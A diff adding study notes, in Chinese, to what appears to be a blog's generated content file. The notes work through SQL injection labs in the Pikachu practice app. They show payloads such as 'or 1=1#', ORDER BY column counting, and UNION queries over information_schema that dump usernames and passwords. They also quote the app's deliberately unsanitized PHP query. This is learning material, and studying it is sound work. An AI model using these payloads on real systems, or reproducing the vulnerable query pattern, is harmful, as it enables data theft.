@@ -2436,6 +2436,85 @@ ed-1=x*\phi(n)</script><p>如果我们已知p,q的位数，那就大概知道n�
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure>
 <p><img src="/2021/06/07/pikachuRecord/image-20210615232221004.png" alt="image-20210615232221004"></p>
+<h3 id="4-2-字符型注入"><a href="#4-2-字符型注入" class="headerlink" title="4.2 字符型注入"></a>4.2 字符型注入</h3><p><img src="/2021/06/07/pikachuRecord/image-20210627202218102.png" alt="image-20210627202218102"></p>
+<ul>
+<li>输入 <code>1&#39;</code> 报错</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
+<ul>
+<li>猜测查询语句为</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM 表名 WHERE username=&#x27;输入的用户名&#x27;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>所以需要先闭合前面的单引号，然后注释后面的单引号，输入以下内容</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1#</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/07/pikachuRecord/image-20210627202628179.png" alt="image-20210627202628179"></p>
+<p><a href="https://blog.csdn.net/weixin_41607190/article/details/82818804">原理参考</a></p>
+<hr>
+<h4 id="关于-or-1-1-的解释"><a href="#关于-or-1-1-的解释" class="headerlink" title="关于 or 1=1 的解释"></a>关于 <code>or 1=1</code> 的解释</h4><ul>
+<li>如上述输入后，原本的查询语句就会变成</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM 表名 WHERE username=&#x27;1&#x27; or 1=1#&#x27;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这条语句条件判断会被后面的 <code>or 1=1</code> 影响，因为一直为真，所以任意 username 都会被查询    </li>
+</ul>
+<hr>
+<h3 id="4-3-搜索型注入"><a href="#4-3-搜索型注入" class="headerlink" title="4.3 搜索型注入"></a>4.3 搜索型注入</h3><ul>
+<li>只要输入用户名的一部分，就可以找到该用户并输出其信息</li>
+</ul>
+<p><img src="/2021/06/07/pikachuRecord/image-20210627203853344.png" alt="image-20210627203853344" style="zoom:80%;"></p>
+<ul>
+<li>所以可以想到 MYSQL 中 <a href="https://www.yuque.com/victorinfo/mysqlnote/ch08">用通配符过滤</a> ，也即使用 <code>%</code> 来表示任意字符出现任意次数，所以查询语句的后半段大致应该是 <code>username = &#39;%用户名的部分字符%&#39;</code> </li>
+<li>因此，与上一例子同理，可以先输入任意字符然后闭合前面的单引号，并注释后面的单引号</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1#</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/07/pikachuRecord/image-20210627204356615.png" alt="image-20210627204356615" style="zoom:80%;"></p>
+<h3 id="4-4-xx型注入"><a href="#4-4-xx型注入" class="headerlink" title="4.4 xx型注入"></a>4.4 xx型注入</h3><ul>
+<li>看一下源码 <code>\xampp\htdocs\pikachu\vul\sqli</code></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里没有做任何处理，直接拼到select里面去了</span></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="comment">//这里的变量是字符型，需要考虑闭合</span></span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select id,email from member where username=(&#x27;<span class="subst">$name</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>所以需要闭合前面的小括号</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) or 1=1#</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/07/pikachuRecord/image-20210627205214188.png" alt="image-20210627205214188" style="zoom:80%;"></p>
+<h3 id="拓展1-联合查询"><a href="#拓展1-联合查询" class="headerlink" title="拓展1 联合查询"></a>拓展1 联合查询</h3><p><a href="https://www.bilibili.com/video/BV1Y7411f7ic?p=26&amp;spm_id_from=pageDriver">参考</a></p>
+<h4 id="UNION"><a href="#UNION" class="headerlink" title="UNION"></a>UNION</h4><h5 id="如何查询字段数？"><a href="#如何查询字段数？" class="headerlink" title="如何查询字段数？"></a>如何查询字段数？</h5><ul>
+<li>利用 <code>order by 1</code> 测试，以字符型注入为例，可以输入</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 1#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 2#</span><br></pre></td></tr></table></figure>
+<p>返回结果均为</p>
+<p><img src="/2021/06/07/pikachuRecord/image-20210627210220009.png" alt="image-20210627210220009" style="zoom:80%;"></p>
+<ul>
+<li>当输入</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3#</span><br></pre></td></tr></table></figure>
+<p>报错</p>
+<p><img src="/2021/06/07/pikachuRecord/image-20210627210307201.png" alt="image-20210627210307201"></p>
+<ul>
+<li><p>因此可以确定有两个字段</p>
+</li>
+<li><p>可以通过 UNION 查询，获取数据库名 <code>database()</code>，版本 <code>version()</code> ，用户 <code>user()</code> 。当然如果只需要查询其中某个信息，可以用任意数值代替其他字段，如</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select database(),2#</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/07/pikachuRecord/image-20210627210627812.png" alt="image-20210627210627812" style="zoom:80%;"></p>
+<h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><h5 id="a-获取表名-table-schema"><a href="#a-获取表名-table-schema" class="headerlink" title="a. 获取表名 table_schema"></a>a. 获取表名 table_schema</h5><ul>
+<li>根据上文，我们已经可以知道数据库名称为 pikachu ，可以构造查询语句，查询 table_schema</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;union select 1,table_name from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/07/pikachuRecord/image-20210627212118693.png" alt="image-20210627212118693" style="zoom:80%;"></p>
+<h5 id="b-获取字段名-table-name"><a href="#b-获取字段名-table-name" class="headerlink" title="b. 获取字段名 table_name"></a>b. 获取字段名 table_name</h5><ul>
+<li>由上文可知，有一个表为 user，所以里面极可能存放用户名及密码等重要信息</li>
+<li>同理可以构造查询语句，查询表 users 中的字段</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;users&#x27;#</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/07/pikachuRecord/image-20210627212426636.png" alt="image-20210627212426636" style="zoom:80%;"></p>
+<h5 id="c-获取内容"><a href="#c-获取内容" class="headerlink" title="c. 获取内容"></a>c. 获取内容</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select username,password from users#</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/07/pikachuRecord/image-20210627212713423.png" alt="image-20210627212713423" style="zoom:80%;"></p>
+<h3 id="拓展2-报错"><a href="#拓展2-报错" class="headerlink" title="拓展2 报错"></a>拓展2 报错</h3><p><a href="https://www.bilibili.com/video/BV1Y7411f7ic?p=28">p28</a></p>
 ]]></content>
       <categories>
         <category>笔记</category>
